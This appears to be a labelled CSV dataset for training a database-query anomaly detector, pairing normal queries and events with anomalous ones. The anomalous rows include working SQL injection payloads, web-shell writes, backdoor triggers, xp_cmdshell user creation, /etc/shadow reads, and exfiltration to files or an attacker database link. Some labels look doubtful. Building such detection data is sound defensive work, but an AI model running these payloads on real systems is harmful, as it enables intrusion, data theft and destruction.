query log,status,label
Recursive CTE with no termination – 100% CPU,anormaly,0
"Cartesian product: SELECT * FROM A, B, C, D",anormaly,0
Infinite loop in stored procedure 'sp_calc',anormaly,0
Massive sort operation: ORDER BY RAND() LIMIT 1 ON 10M rows,anormaly,0
Query with 50 JOINs – timeout after 300s,anormaly,0
Memory grant > 90% of server RAM,anormaly,0
Repeated queries with no index – full table scans,anormaly,0
Spam of small queries: 10K/min from botnet,anormaly,0
Report query: JOIN orders + customers – completed in 2s,normaly,1
10 concurrent users during business hours,normaly,1
CTE used for hierarchy – executed normally,normaly,1
SELECT with 3 JOINs – uses covering index,normaly,1
Stored procedure 'sp_monthly_report' ran successfully,normaly,1
Random sample: SELECT * FROM logs ORDER BY RAND() LIMIT 10,normaly,1
Complex analytics query – completed in 45s (expected),normaly,1
Memory usage: 40% during peak load,normaly,1
Query uses index on user_id – fast response,normaly,1
API served 500 req/min – within SLA,normaly,1
Query runtime jumped from 50ms to 12s (plan changed),anormaly,0
Parameter sniffing caused bad plan – 100x slowdown,anormaly,0
Missing index on WHERE clause – 1M row scan,anormaly,0
Implicit conversion: WHERE id = '123' (id is INT),anormaly,0
STATISTICS outdated – wrong row estimates,anormaly,0
Blocking chain: SPID 55 blocked by SPID 60 for 5 min,anormaly,0
Deadlock detected: 3 processes involved,anormaly,0
Query with LIKE '%keyword%' – no full-text index,anormaly,0
Cursor used instead of set-based – 10x slower,anormaly,0
TempDB full due to spill from hash join,anormaly,0
Query runtime: 45ms (consistent with baseline),normaly,1
Parameterized query – stable execution plan,normaly,1
Index seek used – 5 rows returned,normaly,1
WHERE user_id = 789 (correct data type),normaly,1
Auto-update stats ran – query fast,normaly,1
No blocking – all sessions idle,normaly,1
No deadlocks in last 24h,normaly,1
"Full-text search used: CONTAINS(text, 'keyword')",normaly,1
Set-based UPDATE – completed in 200ms,normaly,1
TempDB usage: 10% – normal,normaly,1
AUTO_CLOSE enabled on production DB,anormaly,0
Recovery model = SIMPLE on critical DB,anormaly,0
No backup in last 7 days,anormaly,0
Max degree of parallelism = 0 on OLTP server,anormaly,0
Ad hoc queries enabled – plan cache bloated,anormaly,0
xp_cmdshell enabled – security risk,anormaly,0
Default trace disabled,anormaly,0
Orphaned users found in 5 databases,anormaly,0
Deprecated feature: TEXT column used,anormaly,0
DB owner = 'sa' – not best practice,anormaly,0
AUTO_CLOSE = OFF (best practice),normaly,1
Recovery model = FULL with log backups,normaly,1
Full backup completed at 02:00 AM,normaly,1
MAXDOP = 8 (aligned with core count),normaly,1
Optimize for ad hoc workloads = ON,normaly,1
xp_cmdshell = disabled,normaly,1
Default trace = enabled,normaly,1
All users mapped to logins,normaly,1
Migrated TEXT to VARCHAR(MAX),normaly,1
DB owner = 'db_admin' (non-sa),normaly,1
"Transfer $500,000 to new account in high-risk country",anormaly,0
Refund issued before payment confirmed,anormaly,0
Negative quantity in inventory adjustment,anormaly,0
User applied 99% discount coupon on $10K order,anormaly,0
Same credit card used for 100 orders in 1 hour,anormaly,0
Round-trip transaction: A ? B ? A in 2 min,anormaly,0
Invoice total ? line item sum ($1 discrepancy),anormaly,0
Payment marked as 'completed' with $0 amount,anormaly,0
Currency mismatch: USD payment for EUR invoice,anormaly,0
Internal test transaction with real customer ID,anormaly,0
Transfer $200 to verified savings account,normaly,1
Refund processed after 7-day return window,normaly,1
Inventory adjusted: +10 units (recount),normaly,1
10% loyalty discount applied to order,normaly,1
User made 3 purchases in 1 hour (normal),normaly,1
Split payment: $50 + $30 for same order,normaly,1
Invoice total matches line items ($149.99),normaly,1
Payment of $0 for free trial signup,normaly,1
Order in EUR – paid with EUR card,normaly,1
Test transaction with test_customer_id,normaly,1
Bypassed OTP by setting 'skip_mfa=true' in URL,anormaly,0
Changed order status from 'pending' to 'shipped' via API,anormaly,0
Accessed /admin/users without role check,anormaly,0
Modified JWT token: role=“admin”,anormaly,0
Used debug endpoint /api/v1/internal/delete_all,anormaly,0
Sent request with X-User-ID: 999 (impersonation),anormaly,0
Disabled rate limiting via header: X-Skip-Limit=1,anormaly,0
Posted review with rating=10 (max is 5),anormaly,0
Uploaded .exe file via profile picture endpoint,anormaly,0
Called /checkout?bypass_tax=true,anormaly,0
Completed MFA with Google Authenticator,normaly,1
Order status updated by warehouse system,normaly,1
Accessed /user/profile (authorized),normaly,1
Valid JWT token – role=“customer”,normaly,1
Used public API /api/v1/products,normaly,1
X-User-ID matches session user,normaly,1
Rate-limited: 100 req/hour (normal),normaly,1
Rating submitted: 4 stars,normaly,1
"Uploaded profile.jpg (JPEG, 200KB)",normaly,1
Checkout with standard tax calculation,normaly,1
SELECT * FROM users WHERE id = '1' OR '1'='1';,anormaly,0
"SELECT username, password FROM users WHERE id = 10 UNION SELECT user, password FROM mysql.user;",anormaly,0
SELECT * FROM products WHERE id = 1; WAITFOR DELAY '0:0:10';--,anormaly,0
admin'--,anormaly,0
"SELECT * FROM items WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a);",anormaly,0
EXEC sp_executeSQL N'SELECT * FROM Employees WHERE Name = ''' + @name + '''',anormaly,0
"1' GROUP BY users.password, users.username HAVING 1=1--",anormaly,0
SELECT * FROM news WHERE id = -1 OR 2+2-3=1,anormaly,0
SELECT ASYNC_KEEPALIVE FROM dual WHERE 1=1 AND (SELECT 5834 FROM (SELECT(SLEEP(5)))YmSX),anormaly,0
INSERT INTO logs (msg) VALUES ('test'); ATTACH DATABASE '/var/www/html/shell.php' AS pwn; --,anormaly,0
ALTER USER 'sa' IDENTIFIED BY 'password123';,anormaly,0
"SELECT user, host, authentication_string FROM mysql.user;",anormaly,0
CREATE USER 'attacker'@'%' IDENTIFIED BY 'Aa123456!';,anormaly,0
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('new_pass');,anormaly,0
SELECT * FROM app_users WHERE password_hash LIKE '$2b$10$%';,anormaly,0
UPDATE users SET password = 'plain_text_password' WHERE role = 'admin';,anormaly,0
DROP USER 'security_admin'@'localhost';,anormaly,0
GRANT USAGE ON *.* TO 'temp_user'@'%' IDENTIFIED BY '123';,anormaly,0
SELECT load_file('/etc/shadow');,anormaly,0
SELECT * FROM sys.database_principals WHERE type_desc = 'SQL_USER';,anormaly,0
GRANT ALL PRIVILEGES ON *.* TO 'web_user'@'%';,anormaly,0
"EXEC sp_addsrvrolemember 'web_app_user', 'sysadmin';",anormaly,0
CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW EXECUTE PROCEDURE grant_admin();,anormaly,0
UPDATE pg_authid SET rolsuper = true WHERE rolname = 'guest';,anormaly,0
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';,anormaly,0
EXEC master..xp_cmdshell 'net user /add attacker pass123';,anormaly,0
ALTER USER 'developer' WITH SUPERUSER;,anormaly,0
CREATE OR REPLACE VIEW system_config AS SELECT * FROM secret_table;,anormaly,0
SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/log.php';,anormaly,0
CREATE EVENT e_backdoor ON SCHEDULE EVERY 1 HOUR DO UPDATE users SET role='admin';,anormaly,0
"SELECT credit_card_number, cvv, expiry FROM payments WHERE amount > 1000;",anormaly,0
"SELECT id_card_number, full_name, address FROM patient_records;",anormaly,0
SELECT * FROM oauth_tokens WHERE expires_at > NOW();,anormaly,0
"SELECT email, hashed_password, salt FROM members WHERE is_admin = 1;",anormaly,0
SELECT social_security_number FROM employees;,anormaly,0
SELECT private_key FROM ssl_certs;,anormaly,0
SELECT * FROM customer_logs WHERE payload LIKE '%API_KEY%';,anormaly,0
SELECT phone_number FROM users WHERE country = 'TH' LIMIT 1000000;,anormaly,0
SELECT backup_path FROM system_settings;,anormaly,0
SELECT DISTINCT(ip_address) FROM login_history;,anormaly,0
"SELECT * FROM orders INTO OUTFILE '/tmp/exfil_data.csv' FIELDS TERMINATED BY ',';",anormaly,0
COPY (SELECT * FROM transactions) TO '/tmp/dump.sql';,anormaly,0
"SELECT JSON_ARRAYAGG(JSON_OBJECT(id, email, secret)) FROM sensitive_table;",anormaly,0
SELECT * FROM users INTO DUMPFILE '/var/lib/mysql-files/users.bak';,anormaly,0
BACKUP DATABASE production TO DISK = 'Z:\external_share\leak.bak';,anormaly,0
SELECT CAST(CC_NUM AS BINARY) FROM payments;,anormaly,0
SELECT * FROM logs WHERE date > '2020-01-01' FOR XML AUTO;,anormaly,0
SELECT b64encode(customer_data) FROM vault;,anormaly,0
INSERT INTO remote_table SELECT * FROM local_sensitive_table@attacker_db;,anormaly,0
SELECT * FROM hr_records WHERE salary > 0 ORDER BY salary DESC LIMIT 9999999;,anormaly,0
UPDATE products SET price = 0.01 WHERE price > 1000;,anormaly,0
DELETE FROM system_configs;,anormaly,0
UPDATE users SET email = 'hacked@evil.com';,anormaly,0
TRUNCATE TABLE transaction_history;,anormaly,0
UPDATE account_balances SET balance = balance + 1000000 WHERE account_id = 99;,anormaly,0
UPDATE inventory SET stock_count = -1;,anormaly,0
DROP TABLE logs_2025;,anormaly,0
UPDATE settings SET value = 'false' WHERE key = 'two_factor_auth_enabled';,anormaly,0
DELETE FROM orders WHERE status = 'pending';,anormaly,0
UPDATE votes SET candidate_id = 5;,anormaly,0
"SELECT a.*, b.*, c.* FROM large_table a, large_table b, large_table c;",anormaly,0
WITH RECURSIVE t(n) AS (VALUES (1) UNION ALL SELECT n+1 FROM t) SELECT n FROM t;,anormaly,0
"SELECT REPEAT('A', 1000000000);",anormaly,0
SELECT * FROM logs WHERE message LIKE '%% %%% %%%% %%%%%';,anormaly,0
BEGIN; LOCK TABLE users IN EXCLUSIVE MODE;,anormaly,0
"SELECT BENCHMARK(100000000, MD5('test'));",anormaly,0
"SELECT * FROM big_data ORDER BY SHA2(data_column, 512);",anormaly,0
INSERT INTO temp_table SELECT * FROM big_table JOIN big_table;,anormaly,0
CREATE INDEX idx_heavy ON logs(long_text_column(255));,anormaly,0
ANALYZE TABLE massive_table;,anormaly,0
SELECT * FROM users WHERE YEAR(created_at) = 2024;,anormaly,0
SELECT * FROM orders WHERE status != 'completed';,anormaly,0
SELECT * FROM products WHERE description LIKE '%iphone%';,anormaly,0
SELECT count(*) FROM (SELECT DISTINCT * FROM transactions) AS t;,anormaly,0
"SELECT user_id, (SELECT count(*) FROM orders WHERE orders.user_id = users.id) FROM users;",anormaly,0
SELECT * FROM sensitive_data WHERE secret_key = 123;,anormaly,0
SELECT * FROM logs ORDER BY rand() LIMIT 1;,anormaly,0
SELECT * FROM table1 JOIN table2;,anormaly,0
SELECT * FROM items WHERE id IN (SELECT id FROM other_table);,anormaly,0
SELECT sum(price) FROM sales;,anormaly,0
UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance > 0;,anormaly,0
"INSERT INTO transactions (from_id, to_id, amount) VALUES (10, 20, -5000);",anormaly,0
UPDATE coupons SET usage_count = usage_count - 1;,anormaly,0
SELECT * FROM withdrawals WHERE amount > (SELECT credit_limit FROM users WHERE id = withdrawals.user_id);,anormaly,0
"INSERT INTO ledger (id, amount, currency) VALUES (999, 100, 'BTC');",anormaly,0
UPDATE orders SET discount_percent = 100 WHERE user_id = 55;,anormaly,0
UPDATE subscription SET expiry_date = '2099-12-31';,anormaly,0
"INSERT INTO audit_log (user_id, action) VALUES (1, 'DELETED_OWN_DEBT');",anormaly,0
SELECT * FROM invoices WHERE total_tax < 0;,anormaly,0
UPDATE payments SET status = 'PAID' WHERE transaction_id = 'failed_id_123';,anormaly,0
"CREATE TABLE cache_data (id INT PRIMARY KEY, val VARCHAR(255));",normaly,1
ALTER TABLE users ADD COLUMN last_login_ip VARCHAR(45);,normaly,1
CREATE INDEX idx_orders_customer ON orders(customer_id);,normaly,1
DROP TABLE IF EXISTS temp_session_data;,normaly,1
ANALYZE TABLE products;,normaly,1
SELECT * FROM users WHERE id = 105;,normaly,1
"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",normaly,1
UPDATE profile SET bio = 'Hello world' WHERE user_id = 442;,normaly,1
DELETE FROM sessions WHERE expiry < '2025-01-01';,normaly,1
"REPLACE INTO settings (key, value) VALUES ('theme', 'dark');",normaly,1
"SELECT p.name, o.quantity FROM products p JOIN order_items o ON p.id = o.product_id WHERE o.order_id = 55;",normaly,1
